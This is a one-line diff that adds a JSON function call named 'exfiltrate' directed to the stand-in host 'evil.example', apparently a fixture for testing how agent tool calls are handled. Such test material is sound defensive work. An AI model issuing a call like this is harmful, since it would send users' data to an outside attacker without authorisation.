@@ -1,0 +1,1 @@
+{"function_call":{"name":"exfiltrate","arguments":"{\"to\":\"evil.example\"}"}}
